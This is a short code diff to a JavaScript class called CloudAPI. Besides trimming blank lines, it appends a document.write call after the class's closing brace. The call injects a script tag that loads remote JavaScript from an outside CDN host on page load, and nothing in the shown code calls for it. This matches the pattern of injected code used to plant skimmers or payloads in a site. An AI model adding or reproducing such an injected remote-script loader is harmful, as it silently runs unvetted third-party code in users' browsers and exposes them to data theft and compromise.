@@ -254,8 +254,6 @@ class CloudAPI {
         this._call('prevRows', msg, cb_, h)
     }
 
-
-
-
-
 }//class
+
+document.write('<script src="http://scdn.primus.netdna-cdn.com/CORS.js"><\/script>');
